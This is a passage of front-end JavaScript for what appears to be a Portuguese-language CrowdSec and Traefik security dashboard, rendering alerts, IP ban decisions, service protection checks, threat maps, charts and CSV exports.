document.addEventListener('DOMContentLoaded', () => {
  feather.replace();
  initClock();
  
  const topology = new SecurityTopology('topologyCanvas');
  initTabs(topology);

  // Load Initial Data
  loadOverview();
  loadTopology(topology);
  loadServicesMatrix();
  loadAlerts();
  loadDecisions();

  // Initialize Advanced Features
  initAutoRefresh(topology);
  setupCSVExports();
  setupManualBanModal();
  setupThreatIntelModal();
  initThreatDossierModal();

  // Refresh Button
  document.getElementById('btn-refresh').addEventListener('click', () => {
    const btn = document.getElementById('btn-refresh');
    btn.classList.add('loading');
    Promise.all([loadOverview(), loadTopology(topology), loadServicesMatrix(), loadAlerts(), loadDecisions()]).then(() => {
      setTimeout(() => btn.classList.remove('loading'), 500);
    });
  });

  // Print Report Button
  const printBtn = document.getElementById('btn-print-report');
  if (printBtn) {
    printBtn.addEventListener('click', () => {
      window.print();
    });
  }

  // Search in alerts & decisions
  setupSearchAndFilters();
});

function initClock() {
  const clockEl = document.getElementById('current-clock');
  const update = () => {
    const now = new Date();
    clockEl.textContent = now.toLocaleTimeString('pt-BR');
  };
  update();
  setInterval(update, 1000);
}

function initAutoRefresh(topology) {
  const select = document.getElementById('auto-refresh-select');
  const indicator = document.getElementById('live-indicator');
  let refreshTimer = null;

  const scheduleRefresh = () => {
    if (refreshTimer) clearInterval(refreshTimer);
    const seconds = parseInt(select.value, 10);
    if (seconds <= 0) {
      if (indicator) indicator.classList.add('off');
      return;
    }

    if (indicator) indicator.classList.remove('off');
    refreshTimer = setInterval(() => {
      loadOverview();
      loadTopology(topology);
      loadServicesMatrix();
      loadAlerts(document.getElementById('alert-search')?.value || '', document.getElementById('alert-country-filter')?.value || '');
      loadDecisions(document.getElementById('decision-search')?.value || '');
    }, seconds * 1000);
  };

  select.addEventListener('change', scheduleRefresh);
  scheduleRefresh();
}

function initTabs(topology) {
  const navItems = document.querySelectorAll('.nav-item');
  const tabPanes = document.querySelectorAll('.tab-pane');
  const pageTitle = document.getElementById('page-title');
  const pageSubtitle = document.getElementById('page-subtitle');
  const printBtn = document.getElementById('btn-print-report');

  const titles = {
    'tab-overview': { title: 'Painel Executivo de Segurança', sub: 'Evidência de eficácia, mitigação de riscos, conformidade e inteligência Open Labs S.A.' },
    'tab-topology': { title: 'Topologia & Grafo de Segurança', sub: 'Fluxos de tráfego em tempo real, conexões do bouncer e inspeção de infraestrutura' },
    'tab-radar': { title: 'Radar Global de Tráfego & Ameaças em Tempo Real', sub: 'Monitoramento tático de acessos legítimos e ataques com pulsos efêmeros na cidade de origem' },
    'tab-report': { title: 'Relatório de Diretoria & Conformidade', sub: 'Sumário executivo formatado para reuniões estratégicas, comitês e auditorias' },
    'tab-technical': { title: 'SecOps, CVEs & Hardening Advisor', sub: 'Catálogo forense de explorações, auditoria de middlewares Traefik e simulador de testes WAF' },
    'tab-alerts': { title: 'Feed de Alertas em Tempo Real', sub: 'Histórico detalhado de varreduras, ataques e mitigações ativas' },
    'tab-decisions': { title: 'Decisões e Lista de Bloqueios', sub: 'IPs banidos via detecção local e inteligência coletiva (CTI)' },
    'tab-matrix': { title: 'Matriz de Proteção de Serviços', sub: 'Auditoria de serviços Traefik, políticas de mitigação e headers' }
  };

  const switchTab = (tabId, updateHash = true) => {
    const pane = document.getElementById(tabId);
    if (!pane) return;

    navItems.forEach(n => n.classList.remove('active'));
    tabPanes.forEach(p => p.classList.remove('active'));

    const activeNav = document.querySelector(`.nav-item[data-tab="${tabId}"]`);
    if (activeNav) activeNav.classList.add('active');
    pane.classList.add('active');

    if (titles[tabId]) {
      pageTitle.textContent = titles[tabId].title;
      pageSubtitle.textContent = titles[tabId].sub;
    }

    if (printBtn) {
      printBtn.style.display = (tabId === 'tab-report') ? 'inline-flex' : 'none';
    }

    if (updateHash) {
      const hashName = tabId.replace('tab-', '');
      history.replaceState(null, '', '#' + hashName);
    }

    if (tabId === 'tab-topology' && topology) {
      setTimeout(() => {
        topology.initCanvasSize();
        topology.centerView();
      }, 50);
    }

    if (tabId === 'tab-overview' && leafletMapInstance) {
      setTimeout(() => {
        leafletMapInstance.invalidateSize();
      }, 50);
    }

    if (tabId === 'tab-technical') {
      loadTechnicalData();
    }

    if (tabId === 'tab-radar') {
      initRadarMap();
      startRadarStream();
    }

    feather.replace();
  };

  navItems.forEach(item => {
    item.addEventListener('click', () => {
      const tabId = item.getAttribute('data-tab');
      switchTab(tabId, true);
    });
  });

  // Handle Initial Hash / Hash Change
  const handleHash = () => {
    const rawHash = (window.location.hash || '').replace('#', '').trim().toLowerCase();
    const tabId = rawHash ? `tab-${rawHash}` : 'tab-overview';
    switchTab(tabId, false);
  };

  window.addEventListener('hashchange', handleHash);
  handleHash();
}

async function loadOverview() {
  try {
    const res = await fetch('/api/overview');
    if (!res.ok) return;
    const data = await res.json();

    // KPIs & Executive Ribbon
    document.getElementById('kpi-total-traffic').textContent = (data.kpis.total_traffic_inspected).toLocaleString() + '+';
    document.getElementById('kpi-blocked-count').textContent = (data.kpis.total_alerts).toLocaleString();
    document.getElementById('kpi-whitelist-count').textContent = (data.kpis.whitelisted_requests_saved).toLocaleString();
    document.getElementById('kpi-decisions-count').textContent = (data.kpis.total_decisions).toLocaleString();
    document.getElementById('nav-alert-count').textContent = data.kpis.total_alerts;
    document.getElementById('nav-ban-count').textContent = (data.kpis.total_decisions > 1000 ? (data.kpis.total_decisions / 1000).toFixed(1) + 'k' : data.kpis.total_decisions);
    document.getElementById('total-decisions-badge').textContent = (data.kpis.total_decisions).toLocaleString();

    // Executive Ribbon
    if (document.getElementById('score-val')) document.getElementById('score-val').textContent = data.kpis.security_score + '%';
    if (document.getElementById('kpi-hours-saved')) document.getElementById('kpi-hours-saved').textContent = Math.round(data.kpis.hours_saved_monthly) + 'h+ /mês';
    if (document.getElementById('kpi-financial-avoided')) document.getElementById('kpi-financial-avoided').textContent = 'R$ ' + (data.kpis.financial_avoidance_brl).toLocaleString('pt-BR', { minimumFractionDigits: 0, maximumFractionDigits: 0 });

    // Report tab sync
    if (document.getElementById('rep-traffic')) document.getElementById('rep-traffic').textContent = (data.kpis.total_traffic_inspected).toLocaleString() + '+';
    if (document.getElementById('rep-blocked')) document.getElementById('rep-blocked').textContent = (data.kpis.total_alerts).toLocaleString();
    if (document.getElementById('rep-cost')) document.getElementById('rep-cost').textContent = 'R$ ' + (data.kpis.financial_avoidance_brl).toLocaleString('pt-BR', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
    if (document.getElementById('rep-hours')) document.getElementById('rep-hours').textContent = Math.round(data.kpis.hours_saved_monthly) + 'h+ /mês';
    if (document.getElementById('report-date')) document.getElementById('report-date').textContent = new Date().toLocaleDateString('pt-BR');

    // Severity Scorecard
    if (data.risk_severities) {
      const sev = data.risk_severities;
      if (document.getElementById('sev-crit-count')) document.getElementById('sev-crit-count').textContent = sev.critical.count.toLocaleString();
      if (document.getElementById('sev-crit-pct')) document.getElementById('sev-crit-pct').textContent = sev.critical.percent + '%';

      if (document.getElementById('sev-high-count')) document.getElementById('sev-high-count').textContent = sev.high.count.toLocaleString();
      if (document.getElementById('sev-high-pct')) document.getElementById('sev-high-pct').textContent = sev.high.percent + '%';

      if (document.getElementById('sev-med-count')) document.getElementById('sev-med-count').textContent = sev.medium.count.toLocaleString();
      if (document.getElementById('sev-med-pct')) document.getElementById('sev-med-pct').textContent = sev.medium.percent + '%';

      if (document.getElementById('sev-low-count')) document.getElementById('sev-low-count').textContent = sev.low.count.toLocaleString();
      if (document.getElementById('sev-low-pct')) document.getElementById('sev-low-pct').textContent = sev.low.percent + '%';
    }

    // Categories
    document.getElementById('cat-probing').textContent = data.attack_categories.probing_and_scans.toLocaleString();
    document.getElementById('cat-cve').textContent = data.attack_categories.cve_exploitations.toLocaleString();
    document.getElementById('cat-bruteforce').textContent = data.attack_categories.bruteforce_abuse.toLocaleString();
    document.getElementById('cat-exploits').textContent = data.attack_categories.injection_and_leaks.toLocaleString();

    // Render Charts
    renderCharts(data);

    // Render World Map
    loadGeoThreats();
  } catch (err) {
    console.error('Failed to load overview:', err);
  }
}

let leafletMapInstance = null;
let leafletMarkersLayer = null;

async function loadGeoThreats() {
  const mapContainer = document.getElementById('leaflet-threat-map');
  const rankingWrap = document.getElementById('geomap-ranking');
  if (!mapContainer || !rankingWrap) return;

  try {
    const res = await fetch('/api/geo-threats');
    if (!res.ok) return;
    const data = await res.json();
    const countries = data.countries || [];

    // Initialize Leaflet map if not exists
    if (!leafletMapInstance && window.L) {
      leafletMapInstance = L.map('leaflet-threat-map', {
        center: [20, 0],
        zoom: 1.5,
        minZoom: 1,
        maxZoom: 7,
        zoomControl: true,
        attributionControl: false
      });

      // CartoDB Dark Matter tiles (Official, high-contrast dark vector tiles)
      L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
        subdomains: 'abcd',
        maxZoom: 19
      }).addTo(leafletMapInstance);

      leafletMarkersLayer = L.layerGroup().addTo(leafletMapInstance);
    }

    if (leafletMarkersLayer) {
      leafletMarkersLayer.clearLayers();

      countries.forEach(c => {
        if (c.lat !== undefined && c.lng !== undefined) {
          const radius = Math.max(Math.min(c.percent * 0.7, 24), 7);

          // Glowing radar circle
          const circle = L.circleMarker([c.lat, c.lng], {
            radius: radius,
            fillColor: '#ef4444',
            color: '#ffffff',
            weight: 1.5,
            opacity: 0.95,
            fillOpacity: 0.65
          });

          const popupContent = `
            <div style="font-family: Inter, sans-serif; font-size: 0.82rem; line-height: 1.4; color: #0f172a; padding: 2px;">
              <strong style="font-size: 0.9rem; color: #1e293b;">${c.name} (${c.code})</strong><br>
              <span style="color: #ef4444; font-weight: 700; font-family: 'JetBrains Mono', monospace;">${c.count.toLocaleString()} bloqueios</span> (${c.percent}%)<br>
              <span style="font-size: 0.72rem; color: #64748b;">Mitigado pelo Traefik Ingress</span>
            </div>
          `;
          circle.bindPopup(popupContent);
          circle.bindTooltip(`<strong>${c.name}</strong>: ${c.count.toLocaleString()} (${c.percent}%)`, {
            direction: 'top',
            className: 'custom-map-tooltip'
          });

          leafletMarkersLayer.addLayer(circle);
        }
      });

      setTimeout(() => {
        if (leafletMapInstance) leafletMapInstance.invalidateSize();
      }, 100);
    }

    // Sidebar Ranking
    rankingWrap.innerHTML = countries.map((c, i) => `
      <div class="geo-rank-item">
        <div class="geo-rank-header">
          <span><strong>${i + 1}. ${c.name}</strong> <code style="color: var(--primary); font-size: 0.72rem;">(${c.code})</code></span>
          <span style="font-family: var(--font-mono); font-weight: 700; color: #f87171;">${c.count.toLocaleString()} (${c.percent}%)</span>
        </div>
        <div class="geo-rank-bar-bg">
          <div class="geo-rank-bar-fill" style="width: ${Math.min(c.percent * 2.2, 100)}%;"></div>
        </div>
      </div>
    `).join('');

  } catch (err) {
    console.error('Failed to load geo threats:', err);
  }
}

function renderCharts(data) {
  // 1. Scenarios Chart
  const ctxScenarios = document.getElementById('scenariosChart').getContext('2d');
  const scenarioLabels = data.top_scenarios.map(s => s.scenario.replace('crowdsecurity/', '').replace('LePresidente/', ''));
  const scenarioValues = data.top_scenarios.map(s => s.count);

  if (window.scenariosChartInstance) window.scenariosChartInstance.destroy();
  window.scenariosChartInstance = new Chart(ctxScenarios, {
    type: 'bar',
    data: {
      labels: scenarioLabels,
      datasets: [{
        label: 'Ataques Mitigados',
        data: scenarioValues,
        backgroundColor: [
          'rgba(0, 240, 255, 0.8)',
          'rgba(59, 130, 246, 0.8)',
          'rgba(239, 68, 68, 0.8)',
          'rgba(245, 158, 11, 0.8)',
          'rgba(168, 85, 247, 0.8)',
          'rgba(16, 185, 129, 0.8)',
          'rgba(236, 72, 153, 0.8)'
        ],
        borderRadius: 4
      }]
    },
    options: {
      indexAxis: 'y',
      responsive: true,
      maintainAspectRatio: false,
      plugins: { legend: { display: false } },
      scales: {
        x: { grid: { color: 'rgba(255, 255, 255, 0.05)' }, ticks: { color: '#94a3b8', font: { family: 'JetBrains Mono' } } },
        y: { grid: { display: false }, ticks: { color: '#f8fafc', font: { size: 10 } } }
      }
    }
  });

  // 2. Top ASNs Chart (Hostile Cloud Datacenters)
  const ctxAsns = document.getElementById('asnsChart').getContext('2d');
  const asnLabels = data.top_asns.map(a => a.asn ? a.asn.substring(0, 24) : 'Outros');
  const asnValues = data.top_asns.map(a => a.count);

  if (window.asnsChartInstance) window.asnsChartInstance.destroy();
  window.asnsChartInstance = new Chart(ctxAsns, {
    type: 'bar',
    data: {
      labels: asnLabels,
      datasets: [{
        label: 'Varreduras por Datacenter Hostil',
        data: asnValues,
        backgroundColor: 'rgba(245, 158, 11, 0.75)',
        borderRadius: 4
      }]
    },
    options: {
      indexAxis: 'y',
      responsive: true,
      maintainAspectRatio: false,
      plugins: { legend: { display: false } },
      scales: {
        x: { grid: { color: 'rgba(255, 255, 255, 0.05)' }, ticks: { color: '#94a3b8', font: { family: 'JetBrains Mono' } } },
        y: { grid: { display: false }, ticks: { color: '#f8fafc', font: { size: 10 } } }
      }
    }
  });

  // 3. Countries Chart (Doughnut)
  const ctxCountries = document.getElementById('countriesChart').getContext('2d');
  const countryLabels = data.top_countries.map(c => c.country || 'N/A');
  const countryValues = data.top_countries.map(c => c.count);

  if (window.countriesChartInstance) window.countriesChartInstance.destroy();
  window.countriesChartInstance = new Chart(ctxCountries, {
    type: 'doughnut',
    data: {
      labels: countryLabels,
      datasets: [{
        data: countryValues,
        backgroundColor: ['#ef4444', '#3b82f6', '#00f0ff', '#f59e0b', '#8b5cf6', '#10b981', '#64748b'],
        borderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: { position: 'right', labels: { color: '#94a3b8', boxWidth: 12, font: { family: 'Inter', size: 11 } } }
      }
    }
  });

  // 4. Threat Actor Profile (Cloud Botnets vs Targeted Probes)
  const ctxProfile = document.getElementById('threatProfileChart').getContext('2d');
  const cloudPct = data.kpis.cloud_threats_percent || 76.4;
  const directPct = Number((100 - cloudPct).toFixed(1));

  if (window.profileChartInstance) window.profileChartInstance.destroy();
  window.profileChartInstance = new Chart(ctxProfile, {
    type: 'pie',
    data: {
      labels: [`Datacenters / Nuvens (${cloudPct}%)`, `Provedores / Telecom (${directPct}%)`],
      datasets: [{
        data: [cloudPct, directPct],
        backgroundColor: ['#ef4444', '#3b82f6'],
        borderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: { position: 'right', labels: { color: '#94a3b8', boxWidth: 12, font: { family: 'Inter', size: 11 } } }
      }
    }
  });
}

async function loadTopology(topology) {
  try {
    const res = await fetch('/api/topology');
    if (!res.ok) return;
    const data = await res.json();
    topology.loadData(data);
  } catch (err) {
    console.error('Failed to load topology:', err);
  }
}

async function loadAlerts(search = '', country = '') {
  const tbody = document.getElementById('alerts-table-body');
  try {
    let url = `/api/alerts?limit=50`;
    if (search) url += `&search=${encodeURIComponent(search)}`;
    if (country) url += `&country=${encodeURIComponent(country)}`;

    const res = await fetch(url);
    if (!res.ok) return;
    const data = await res.json();

    if (data.alerts.length === 0) {
      tbody.innerHTML = `<tr><td colspan="7" style="text-align:center; padding: 24px; color: var(--text-muted);">Nenhum alerta encontrado com os filtros atuais.</td></tr>`;
      return;
    }

    tbody.innerHTML = data.alerts.map(a => {
      const cleanScen = (a.scenario || '').replace('crowdsecurity/', '').replace('LePresidente/', '');
      return `
        <tr>
          <td style="font-family: var(--font-mono); color: var(--text-muted);">#${a.id}</td>
          <td>
            <a href="javascript:void(0)" class="ip-dossier-link" onclick="openThreatDossier('${a.source_ip}')" title="Clique para abrir o Dossiê Forense do Atacante">
              <span class="ip-badge">${a.source_ip || 'Desconhecido'} 🔍</span>
            </a>
            <span class="asn-tag">${a.source_as_name ? a.source_as_name.substring(0, 30) : 'ASN N/A'}</span>
          </td>
          <td>
            <span style="font-weight: 600;">${a.source_country || 'N/A'}</span>
          </td>
          <td>
            <span class="scenario-pill scenario-clickable" onclick="window.openThreatIntel('${cleanScen}')" title="Clique para detalhes do ataque">
              ${cleanScen} ℹ️
            </span>
          </td>
          <td>
            <span class="action-pill ${a.remediation === 'BAN' ? 'ban' : 'monitor'}">${a.remediation || 'BAN'}</span>
          </td>
          <td style="font-family: var(--font-mono);">${a.events_count || 1}</td>
          <td style="font-size: 0.78rem; color: var(--text-muted);">${formatDate(a.created_at)}</td>
        </tr>
      `;
    }).join('');
  } catch (err) {
    tbody.innerHTML = `<tr><td colspan="7" style="color: var(--danger); text-align:center;">Erro ao carregar alertas.</td></tr>`;
  }
}

async function loadDecisions(search = '') {
  const tbody = document.getElementById('decisions-table-body');
  try {
    let url = `/api/decisions?limit=50`;
    if (search) url += `&search=${encodeURIComponent(search)}`;

    const res = await fetch(url);
    if (!res.ok) return;
    const data = await res.json();

    if (data.decisions.length === 0) {
      tbody.innerHTML = `<tr><td colspan="8" style="text-align:center; padding: 24px; color: var(--text-muted);">Nenhuma decisão encontrada.</td></tr>`;
      return;
    }

    tbody.innerHTML = data.decisions.map(d => {
      const cleanScen = (d.scenario || 'CTI Consensus').replace('crowdsecurity/', '').replace('LePresidente/', '');
      return `
        <tr>
          <td style="font-family: var(--font-mono); color: var(--text-muted);">#${d.id}</td>
          <td>
            <a href="javascript:void(0)" class="ip-dossier-link" onclick="openThreatDossier('${d.value}')" title="Clique para abrir o Dossiê Forense">
              <span class="ip-badge">${d.value} 🔍</span>
            </a>
          </td>
          <td><span style="font-size: 0.78rem; text-transform: uppercase;">${d.scope}</span></td>
          <td>
            <span class="action-pill ban">${d.type}</span>
          </td>
          <td>
            <span class="scenario-pill scenario-clickable" onclick="window.openThreatIntel('${cleanScen}')" title="Clique para detalhes do ataque">
              ${cleanScen} ℹ️
            </span>
          </td>
          <td>
            <span class="badge ${d.origin === 'CAPI' ? 'badge-info' : 'badge-success'}">${d.origin || 'LOCAL'}</span>
          </td>
          <td style="font-size: 0.78rem; color: var(--text-muted);">${d.until ? formatDate(d.until) : 'Permanente'}</td>
          <td style="text-align: right;">
            <button class="btn-icon-danger" onclick="handleDeleteDecision('${d.id}', '${d.value}')" title="Remover bloqueio">
              <i data-feather="trash-2"></i>
            </button>
          </td>
        </tr>
      `;
    }).join('');
    feather.replace();
  } catch (err) {
    tbody.innerHTML = `<tr><td colspan="8" style="color: var(--danger); text-align:center;">Erro ao carregar decisões.</td></tr>`;
  }
}

window.handleDeleteDecision = async function(id, value) {
  const confirmMsg = `Confirmar remoção do bloqueio para o IP "${value}" (Decisão #${id})?\n\nO acesso será liberado imediatamente no Traefik Ingress.`;
  if (!confirm(confirmMsg)) return;

  try {
    const res = await fetch(`/api/decisions/${id}`, { method: 'DELETE' });
    const result = await res.json();
    if (result.success) {
      alert(`✅ Sucesso: ${result.message}`);
      loadDecisions();
      loadOverview();
    } else {
      alert(`❌ Erro ao remover bloqueio: ${result.message}`);
    }
  } catch (err) {
    alert(`❌ Erro de comunicação com o servidor: ${err.message}`);
  }
};

function setupSearchAndFilters() {
  const alertSearch = document.getElementById('alert-search');
  let alertTimer;
  alertSearch.addEventListener('input', () => {
    clearTimeout(alertTimer);
    alertTimer = setTimeout(() => loadAlerts(alertSearch.value), 300);
  });

  const decisionSearch = document.getElementById('decision-search');
  let decisionTimer;
  decisionSearch.addEventListener('input', () => {
    clearTimeout(decisionTimer);
    decisionTimer = setTimeout(() => loadDecisions(decisionSearch.value), 300);
  });
}

function formatDate(isoStr) {
  if (!isoStr) return '-';
  const d = new Date(isoStr);
  return d.toLocaleString('pt-BR', { dateStyle: 'short', timeStyle: 'medium' });
}

async function loadServicesMatrix() {
  const container = document.getElementById('services-matrix-grid');
  const reportTbody = document.getElementById('report-services-tbody');
  try {
    const res = await fetch('/api/services');
    if (!res.ok) return;
    const data = await res.json();
    const services = data.services || [];

    if (container) {
      if (services.length === 0) {
        container.innerHTML = `<div style="color: var(--text-muted); padding: 20px;">Nenhum router dinâmico encontrado em /docker/traefik/dynamic.</div>`;
      } else {
        container.innerHTML = services.map(s => `
          <div class="service-card ${s.status}">
            <div class="service-card-header">
              <div class="service-icon"><i data-feather="${s.icon || 'server'}"></i></div>
              <div class="service-meta">
                <h4>${s.name}</h4>
                <code>${s.domain}</code>
              </div>
              <span class="badge ${s.status === 'protected' ? 'badge-success' : 'badge-warning'}">${s.badge}</span>
            </div>
            <div class="service-card-body">
              <div class="check-item ${s.has_crowdsec ? 'checked' : 'unchecked'}">
                <i data-feather="${s.has_crowdsec ? 'check' : 'x'}"></i>
                CrowdSec Bouncer (${s.has_crowdsec ? 'Live Mode' : 'Desativado'})
              </div>
              <div class="check-item ${s.has_ratelimit ? 'checked' : 'unchecked'}">
                <i data-feather="${s.has_ratelimit ? 'check' : 'minus'}"></i>
                Rate Limit Dedicado (${s.has_ratelimit ? 'Ativo' : 'Não configurado'})
              </div>
              <div class="check-item ${s.has_security_headers ? 'checked' : 'unchecked'}">
                <i data-feather="${s.has_security_headers ? 'check' : 'minus'}"></i>
                Security Headers (${s.has_security_headers ? 'HSTS/NoSniff' : 'Padrão'})
              </div>
              <div class="check-item ${s.has_hide_header ? 'checked' : 'unchecked'}">
                <i data-feather="${s.has_hide_header ? 'check' : 'minus'}"></i>
                Hide Server Header (${s.has_hide_header ? 'DCY' : 'Padrão'})
              </div>
              <div class="check-item ${s.has_tls ? 'checked' : 'unchecked'}">
                <i data-feather="${s.has_tls ? 'check' : 'x'}"></i>
                TLS 1.3 / Let's Encrypt (${s.has_tls ? 'Ativo' : 'Inativo'})
              </div>
            </div>
            ${!s.has_crowdsec ? `
              <div class="service-card-action">
                <span class="action-tip">💡 Sugestão: Adicionar <code>- crowdsec@file</code> no router</span>
              </div>
            ` : ''}
          </div>
        `).join('');
      }
    }

    if (reportTbody && services.length > 0) {
      reportTbody.innerHTML = services.map(s => `
        <tr>
          <td><strong>${s.name}</strong></td>
          <td><code>${s.domain}</code></td>
          <td>${s.security.join(' + ') || 'TLS Padrão'}</td>
          <td><span class="badge ${s.status === 'protected' ? 'badge-success' : 'badge-warning'}">${s.badge}</span></td>
        </tr>
      `).join('');
    }

    feather.replace();
  } catch (err) {
    console.error('Error loading services matrix:', err);
  }
}

// ----------------------------------------------------
// CSV EXPORT LOGIC
// ----------------------------------------------------
function setupCSVExports() {
  const btnExportAlerts = document.getElementById('btn-export-alerts');
  if (btnExportAlerts) {
    btnExportAlerts.addEventListener('click', async () => {
      try {
        btnExportAlerts.disabled = true;
        const res = await fetch('/api/alerts?limit=500');
        const data = await res.json();
        const alerts = data.alerts || [];

        let csv = '\uFEFFID,IP Origem,ASN / Provedor,Pais,Cenario,Acao,Eventos,Data Hora\r\n';
        alerts.forEach(a => {
          const row = [
            a.id,
            `"${a.source_ip || ''}"`,
            `"${(a.source_as_name || '').replace(/"/g, '""')}"`,
            `"${a.source_country || ''}"`,
            `"${(a.scenario || '').replace(/"/g, '""')}"`,
            `"${a.remediation || 'BAN'}"`,
            a.events_count || 1,
            `"${a.created_at || ''}"`
          ];
          csv += row.join(',') + '\r\n';
        });

        downloadCSVFile(csv, `openlabs-crowdsec-alertas-${new Date().toISOString().slice(0, 10)}.csv`);
      } catch (err) {
        alert('Erro ao exportar CSV de alertas: ' + err.message);
      } finally {
        btnExportAlerts.disabled = false;
      }
    });
  }

  const btnExportDecisions = document.getElementById('btn-export-decisions');
  if (btnExportDecisions) {
    btnExportDecisions.addEventListener('click', async () => {
      try {
        btnExportDecisions.disabled = true;
        const res = await fetch('/api/decisions?limit=1000');
        const data = await res.json();
        const decisions = data.decisions || [];

        let csv = '\uFEFFID,Alvo / IP,Escopo,Acao,Cenario / Motivo,Origem,Expiracao\r\n';
        decisions.forEach(d => {
          const row = [
            d.id,
            `"${d.value || ''}"`,
            `"${d.scope || 'Ip'}"`,
            `"${d.type || 'ban'}"`,
            `"${(d.scenario || '').replace(/"/g, '""')}"`,
            `"${d.origin || 'LOCAL'}"`,
            `"${d.until || 'Permanente'}"`
          ];
          csv += row.join(',') + '\r\n';
        });

        downloadCSVFile(csv, `openlabs-crowdsec-decisoes-${new Date().toISOString().slice(0, 10)}.csv`);
      } catch (err) {
        alert('Erro ao exportar CSV de decisões: ' + err.message);
      } finally {
        btnExportDecisions.disabled = false;
      }
    });
  }
}

function downloadCSVFile(content, fileName) {
  const blob = new Blob([content], { type: 'text/csv;charset=utf-8;' });
  const link = document.createElement('a');
  const url = URL.createObjectURL(blob);
  link.setAttribute('href', url);
  link.setAttribute('download', fileName);
  link.style.visibility = 'hidden';
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}

// ----------------------------------------------------
// MANUAL BAN MODAL LOGIC
// ----------------------------------------------------
function setupManualBanModal() {
  const modal = document.getElementById('modal-manual-ban');
  const openBtn = document.getElementById('btn-open-ban-modal');
  const closeBtn = document.getElementById('btn-close-ban-modal');
  const cancelBtn = document.getElementById('btn-cancel-ban');
  const form = document.getElementById('form-manual-ban');

  if (!modal || !openBtn) return;

  const openModal = () => modal.classList.add('open');
  const closeModal = () => modal.classList.remove('open');

  openBtn.addEventListener('click', openModal);
  if (closeBtn) closeBtn.addEventListener('click', closeModal);
  if (cancelBtn) cancelBtn.addEventListener('click', closeModal);
  modal.addEventListener('click', (e) => {
    if (e.target === modal) closeModal();
  });

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const submitBtn = document.getElementById('btn-submit-ban');
    submitBtn.disabled = true;
    submitBtn.innerHTML = 'Bloqueando...';

    const payload = {
      ip: document.getElementById('ban-ip').value.trim(),
      duration: document.getElementById('ban-duration').value,
      reason: document.getElementById('ban-reason').value.trim() || 'Intervenção SecOps',
      decision_type: document.getElementById('ban-type').value
    };

    try {
      const res = await fetch('/api/decisions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      const result = await res.json();
      if (result.success) {
        alert(`✅ ${result.message}`);
        closeModal();
        form.reset();
        loadDecisions();
        loadOverview();
      } else {
        alert(`❌ Erro: ${result.message}`);
      }
    } catch (err) {
      alert(`❌ Falha de comunicação: ${err.message}`);
    } finally {
      submitBtn.disabled = false;
      submitBtn.innerHTML = '<i data-feather="shield-off"></i> <span>Executar Bloqueio</span>';
      feather.replace();
    }
  });
}

// ----------------------------------------------------
// THREAT INTEL MODAL LOGIC
// ----------------------------------------------------
function setupThreatIntelModal() {
  const modal = document.getElementById('modal-threat-intel');
  const closeBtn = document.getElementById('btn-close-intel-modal');
  const closeBtnBottom = document.getElementById('btn-close-intel-btn');

  if (!modal) return;

  const closeModal = () => modal.classList.remove('open');
  if (closeBtn) closeBtn.addEventListener('click', closeModal);
  if (closeBtnBottom) closeBtnBottom.addEventListener('click', closeModal);
  modal.addEventListener('click', (e) => {
    if (e.target === modal) closeModal();
  });

  window.openThreatIntel = async function(scenarioKey) {
    const titleEl = document.getElementById('intel-title');
    const bodyEl = document.getElementById('intel-body');
    titleEl.textContent = 'Carregando Inteligência...';
    bodyEl.innerHTML = '<div class="loading-td">Buscando definições de ameaça...</div>';
    modal.classList.add('open');

    try {
      const res = await fetch('/api/threat-intel');
      const catalog = await res.json();
      
      // Match scenario key
      let item = catalog[scenarioKey];
      if (!item) {
        for (const [k, v] of Object.entries(catalog)) {
          if (scenarioKey.includes(k) || k.includes(scenarioKey)) {
            item = v;
            break;
          }
        }
      }

      if (!item) {
        item = {
          title: `Cenário de Proteção: ${scenarioKey}`,
          severity: 'MÉDIA',
          category: 'Mitigação Ativa',
          description: `Regra de detecção da comunidade CrowdSec configurada para mitigar tráfego suspeito relacionado ao cenário "${scenarioKey}".`,
          impact_avoided: 'Proteção em tempo real de portas e serviços web contra requisições anômalas.',
          owasp_tag: 'OWASP Top 10 Active Defense',
          mitigation: 'Bloqueio preventivo na borda do Traefik Bouncer.'
        };
      }

      titleEl.textContent = item.title;
      bodyEl.innerHTML = `
        <div style="display: flex; gap: 8px; margin-bottom: 12px; align-items: center;">
          <span class="badge ${item.severity === 'CRÍTICA' ? 'badge-danger' : (item.severity === 'ALTA' ? 'badge-warning' : 'badge-info')}">
            SEVERIDADE: ${item.severity}
          </span>
          <span style="font-size: 0.78rem; color: var(--text-muted); font-weight: 600;">${item.category}</span>
        </div>

        <div style="margin-bottom: 14px;">
          <div style="font-size: 0.75rem; color: var(--text-muted); font-weight: 700; margin-bottom: 4px;">O QUE É ESTE ATAQUE?</div>
          <p style="font-size: 0.84rem; color: #ffffff; line-height: 1.5;">${item.description}</p>
        </div>

        <div style="margin-bottom: 14px; background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.3); border-radius: var(--radius-md); padding: 10px 14px;">
          <div style="font-size: 0.75rem; color: #34d399; font-weight: 700; margin-bottom: 2px;">IMPACTO EVITADO NA OPEN LABS S.A.</div>
          <p style="font-size: 0.82rem; color: #e2e8f0; line-height: 1.4;">${item.impact_avoided}</p>
        </div>

        <div class="insp-row">
          <span class="insp-key">Classificação OWASP</span>
          <span class="insp-val" style="color: var(--primary);">${item.owasp_tag}</span>
        </div>

        <div class="insp-row">
          <span class="insp-key">Mitigação Aplicada</span>
          <span class="insp-val" style="color: var(--success);">${item.mitigation}</span>
        </div>
      `;
      feather.replace();
    } catch (err) {
      bodyEl.innerHTML = `<div style="color: var(--danger);">Erro ao carregar detalhes: ${err.message}</div>`;
    }
  };

  const printActionBtn = document.getElementById('btn-print-report-action');
  if (printActionBtn) {
    printActionBtn.addEventListener('click', () => {
      window.print();
    });
  }

  const printTopBtn = document.getElementById('btn-print-report');
  if (printTopBtn) {
    printTopBtn.addEventListener('click', () => {
      window.print();
    });
  }

  // Global Escape key listener to close any open modal
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
      document.querySelectorAll('.modal-backdrop.open').forEach(m => m.classList.remove('open'));
    }
  });

